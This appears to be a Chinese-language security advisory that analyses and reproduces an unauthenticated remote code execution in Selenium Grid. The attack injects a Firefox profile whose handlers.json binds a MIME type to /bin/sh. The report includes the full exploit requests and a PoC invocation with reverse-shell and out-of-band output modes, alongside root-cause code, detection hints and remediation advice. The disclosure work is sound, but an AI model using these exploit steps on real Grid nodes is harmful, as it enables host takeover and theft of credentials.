# Selenium Grid 认证前远程代码执行 (Pre-auth RCE) 分析与复现报告

- **漏洞类型**：认证前远程代码执行 (Unauthenticated RCE)
- **攻击向量**：Firefox profile 处理器注入 (profile handler injection)
- **受影响组件**：Selenium Grid / Node（`standalone-firefox`、`node-firefox`、`standalone-docker`、`standalone-all-browsers`、Selenoid 等含 Firefox 的部署）
- **验证版本**：Selenium Grid `4.51.0-SNAPSHOT` (revision `28e0435`)，Firefox `157.0.1`
- **认证要求**：无（默认部署不启用 Basic Auth，全程未发送任何凭证）
- **上游状态**：未修复（Selenium 官方认定为设计行为，参见 SeleniumHQ/selenium#9526）
- **报告日期**：2026-10-09

---

## 1. 摘要

Selenium Grid 的 WebDriver API `POST /session` 接受客户端提供的任意 capabilities。
当节点存在 Firefox 槽位时，攻击者可在 `moz:firefoxOptions.profile` 中传入一个 base64 编码的
ZIP profile。Grid 会把该 profile **原样**下发给 geckodriver，Firefox 安装该 profile 后，
其中的 `handlers.json` 可将任意 MIME 类型绑定到任意可执行文件；攻击者随后导航到一个
`data:<mime>` URI，Firefox 便会把内容“下载”并交给该可执行文件执行，从而在 **Node 主机上
执行任意命令**。

整个过程只需对 `POST /session` 和 `POST /session/{id}/url` 两次请求，且**无需任何认证**。
本报告在 `selenium/standalone-firefox:nightly`（Grid `4.51.0-SNAPSHOT`）上完成了端到端复现，
拿到了以容器内 `seluser` 身份执行 `id` 的输出。

---

## 2. 影响与危害

- 攻击者在 Grid Node 主机（容器）内以运行 Selenium 的用户身份执行任意命令。
- 典型后续利用：加密货币挖矿、反向 shell、横向移动、窃取测试环境凭据/源码、将节点作为代理跳板（proxyjacking）。
- 由于默认 Docker 部署 `docker run -p 4444:4444` 会绑定 `0.0.0.0` 且无认证，暴露在公网的实例可直接被接管。
- 与 Chrome 不同，Firefox 路径**在所有已发布版本上均可利用**，无法通过升级修复。

---

## 3. 根因分析（代码级）

### 3.1 默认无认证，且 `POST /session` 不受内部密钥保护

`SecretOptions.getServerAuthentication()` 只有在同时配置 `router.username` / `router.password`
时才返回非空；`RouterServer` 仅在此时才套上 `BasicAuthenticationFilter`：

```java
// java/src/org/openqa/selenium/grid/router/httpd/RouterServer.java:183-190
UsernameAndPassword uap = secretOptions.getServerAuthentication();
if (uap != null) {
  LOG.info("Requiring authentication to connect");
  route = route.with(new BasicAuthenticationFilter(uap.username(), uap.password()));
}
// 只有 /readyz 被刻意排除在认证之外
Routable routeWithLiveness = Route.combine(route, get("/readyz").to(() -> readinessCheck));
```

面向客户端的会话入口没有内部注册密钥校验（对比同文件中其他内部端点均带 `.with(requiresSecret)`）：

```java
// java/src/org/openqa/selenium/grid/sessionqueue/NewSessionQueue.java:61-70
post("/session")
    .to(() -> req -> {
          SessionRequest sessionRequest =
              new SessionRequest(new RequestId(UUID.randomUUID()), req, Instant.now());
          return addToQueue(sessionRequest);
        }),
```

### 3.2 默认自动探测驱动，且扩展 capabilities 不参与槽位匹配

```java
// java/src/org/openqa/selenium/grid/node/config/NodeOptions.java:83
static final boolean DEFAULT_DETECT_DRIVERS = true;
```

```java
// java/src/org/openqa/selenium/grid/data/DefaultSlotMatcher.java
// goog:/moz:/ms:/safari:/se: 前缀的扩展 capability 不参与匹配
private static final List<String> EXTENSION_CAPABILITIES_PREFIXES =
    List.of("goog:", "moz:", "ms:", "safari:", "se:");
```

因此携带任意 `moz:firefoxOptions` 的请求依旧命中 Firefox 槽位。

### 3.3 核心缺陷：`profile` 被原样透传

```java
// java/src/org/openqa/selenium/grid/node/config/SessionCapabilitiesMutator.java:216-219
if (name.equals("profile")) {
  String rawProfile = (String) value;
  toReturn.put("profile", rawProfile);   // 无任何校验/清洗
}
```

`profile` 被明确列入 `handledOptions` 并原样写回 capabilities。相比之下，`binary` 只在
stereotype 未设置时才允许客户端覆盖（`SessionCapabilitiesMutator.java:227-229`），
且运行期还会被 `DriverServiceSessionFactory` 用节点自身解析出的浏览器路径覆盖：

```java
// java/src/org/openqa/selenium/grid/node/config/DriverServiceSessionFactory.java:132-137
DriverService service = builder.build();
DriverFinder finder = new DriverFinder(service, capabilities);
service.setExecutable(finder.getDriverPath());
if (finder.hasBrowserPath()) {
  capabilities = setBrowserBinary(capabilities, finder.getBrowserPath());
}
```

而 `profile` **没有任何等价防护**。向下游传递时也未被剥离：

```java
// java/src/org/openqa/selenium/grid/node/SessionFactory.java:39-46
static Capabilities stripPerHopCapabilities(Capabilities capabilities) {
  if (capabilities.getCapability("se:remoteUrl") == null) {
    return capabilities;              // 只删 se:remoteUrl，profile 不动
  }
  ...
}
```

### 3.4 完整数据流

```
攻击者
  │  POST /session  (moz:firefoxOptions.profile = base64(zip handlers.json))
  ▼
Router (4444) ──► NewSessionQueue (无认证) ──► Distributor ──► Node
                                                              │
                          SessionCapabilitiesMutator.mergeFirefoxOptions()  ← profile 原样保留
                                                              │
                          stripPerHopCapabilities()  ← 只删 se:remoteUrl
                                                              ▼
                                                        geckodriver
                                                              │ 安装攻击者 profile
                                                              ▼
                                                          Firefox
  攻击者 ── POST /session/{id}/url = data:<mime>;base64,<脚本> ──► Firefox 下载并交由
                                                               handlers.json 注册的 /bin/sh 执行
                                                              ▼
                                                        Node 主机命令执行
```

---

## 4. 复现步骤

### 4.1 环境

```bash
docker pull selenium/standalone-firefox:nightly
docker run -d --name se-rce -p 4444:4444 -p 7900:7900 --shm-size=2g \
  selenium/standalone-firefox:nightly
```

确认版本与无认证状态：

```bash
curl -s http://localhost:4444/status | python3 -m json.tool
# value.nodes[0].version == "4.51.0-SNAPSHOT (revision 28e0435 ...)"
# value.nodes[0].slots[0].stereotype.browserName == "firefox" (157.0)
```

### 4.2 利用（无凭证）

```bash
# 模式一：命令执行 + 外带回显（OOB，自动接收输出）
python3 security-report/poc_selenium_firefox_rce.py \
  --url http://localhost:4444 \
  --cmd 'id; hostname' \
  --lhost 172.17.0.1 --lport 9001 --listen

# 模式二：反弹 shell（--listen 本地接管；--exec 可非交互取回一条命令输出）
python3 security-report/poc_selenium_firefox_rce.py \
  --url http://localhost:4444 \
  --shell bash \
  --lhost 172.17.0.1 --lport 9002 --listen --exec 'id'
```

主要参数：`--url`、`--cmd`/`--shell {bash,python,nc}`（二选一）、`--handler`、`--mime`、`--browser`、
`--trigger {js,url}`、`--lhost`/`--lport`、`--listen`、`--exec`、`--clean-sessions`、`--keep-session`、
`--session-timeout`、`--container`。

> 独立节点 `maxSessions=1`，若槽位被旧会话占用，新建会话会阻塞。用
> `--clean-sessions` 可先删除目标上所有活动会话（也可单独作为清理命令使用），
> 例如：`python3 poc_selenium_firefox_rce.py --url http://127.0.0.1:4444 --clean-sessions`。

PoC 等价于以下两步原始请求：

**第 1 步 — 注入恶意 profile 并创建会话**

```http
POST /session HTTP/1.1
Content-Type: application/json

{
  "capabilities": {
    "alwaysMatch": {
      "browserName": "firefox",
      "moz:firefoxOptions": {
        "profile": "<base64(zip 内含 handlers.json：application/x-ccpoc -> /bin/sh)>"
      }
    }
  }
}
```

其中 `handlers.json`：

```json
{
  "defaultHandlersVersion": {"en-US": 4},
  "mimeTypes": {
    "application/x-ccpoc": {
      "action": 2,
      "extensions": ["poc"],
      "handlers": [{"name": "poc", "path": "/bin/sh"}]
    }
  }
}
```

**第 2 步 — 触发执行**

```http
POST /session/{sessionId}/url HTTP/1.1
Content-Type: application/json

{"url": "data:application/x-ccpoc;charset=utf-8;base64,<base64(#!/bin/sh\nid > /tmp/rce_poc.txt ...)>"}
```

### 4.3 实测结果

会话创建返回 `200`，且响应中回显了注入的 profile（证明其被接受并下发）：

```json
{"value": {"capabilities": {"browserName": "firefox", "browserVersion": "157.0.1",
 "moz:firefoxOptions": {"profile": "UEsDBBQAAAAIAO5dSV2xy1bT..."}}, "sessionId": "62cd472a-..."}}
```

容器内取证：

```
$ cat /tmp/rce_poc.txt
uid=1200(seluser) gid=1201(seluser) groups=1201(seluser),27(sudo)
RCE-OK

$ ls /home/seluser/Downloads/
eFTNyMWO.ccpoc          # Firefox 下载的 payload，被 /bin/sh 执行

$ ls /tmp/rust_mozprofile0bGBL6/handlers.json
/tmp/rust_mozprofile0bGBL6/handlers.json   # 注入的 profile 已安装
```

> 结论：以 Node 容器内 `seluser` 身份成功执行任意命令，**认证前 RCE 成立**。

---

## 5. 检测与排查

- 网络层：4444/5553/5555 端口是否对不可信网络暴露。
- 日志层：Grid/Node 日志中出现
  `Uninteresting...`/`Adding firefox...` 之外，关注异常新会话请求中的 `moz:firefoxOptions.profile`
  字段；Node 上出现 `rust_mozprofile*` 临时目录、`~/Downloads/*` 可疑下载、`geckodriver` 子进程
  异常拉起 `/bin/sh` 等行为。
- 主机层：Selenium 用户进程树中出现 `sh`/`bash`/`curl`/`wget`/挖矿进程；`/tmp` 下可疑脚本。
- 资产测绘：对公网暴露的 `":4444/status"` 做合规盘点（LeakIX/Shodan 均收录此类资产）。

---

## 6. 修复与缓解

优先级从高到低：

1. **网络隔离**：绝不将 Grid/Node 端口暴露到公网；使用防火墙/安全组/VPN/私网，仅在 CI 内网可达。
2. **强制认证**：设置 `SE_ROUTER_USERNAME` / `SE_ROUTER_PASSWORD`（或 `--username/--password`），
   或在前面加带认证的反向代理。注意：认证只覆盖 Router 面，仍需配合第 1 条。
3. **代码层加固（建议上游）**：
   - 在 `SessionCapabilitiesMutator.mergeFirefoxOptions` 中**丢弃或白名单**客户端提供的 `profile`，
     并在 `stripPerHopCapabilities` 中同样剥离，使 Node 只接受自身配置的 profile；
   - 对 `moz:firefoxOptions` 的 `args` / `binary` / `prefs` 采用同样的白名单策略；
   - 为 `POST /session` 增加可选的入站鉴权/速率限制。
4. **降低暴露面**：仅部署 Chrome/Edge 节点（在自动探测路径下 `binary` 覆盖已被 stereotype 覆盖，
   但仍不构成安全边界，不能替代第 1、2 条）。
5. **监控与应急**：发现已失陷节点立即隔离、轮换测试环境凭据、审计横向移动痕迹。

> 说明：`Selenoid`（Go 实现）同样直接透传 capabilities，且项目已归档，无修复。

---

## 7. 参考

- [SeleniumGreed: The RCE That Was Always There — LeakIX](https://blog.leakix.net/2026/02/seleniumgreed-rce/)
- [Wiz Research — SeleniumGreed](https://www.wiz.io/blog/seleniumgreed-cryptomining-exploit-attack-flow-remediation-steps)
- [SeleniumHQ/selenium#9526 — Firefox profile handler](https://github.com/SeleniumHQ/selenium/issues/9526)
- [SeleniumHQ/selenium#9060 — Chrome binary override](https://github.com/SeleniumHQ/selenium/issues/9060)
- [CVE-2022-28108 — Selenium Server (Grid) CSRF](https://github.com/advisories/GHSA-h2rr-m97p-6jq9)
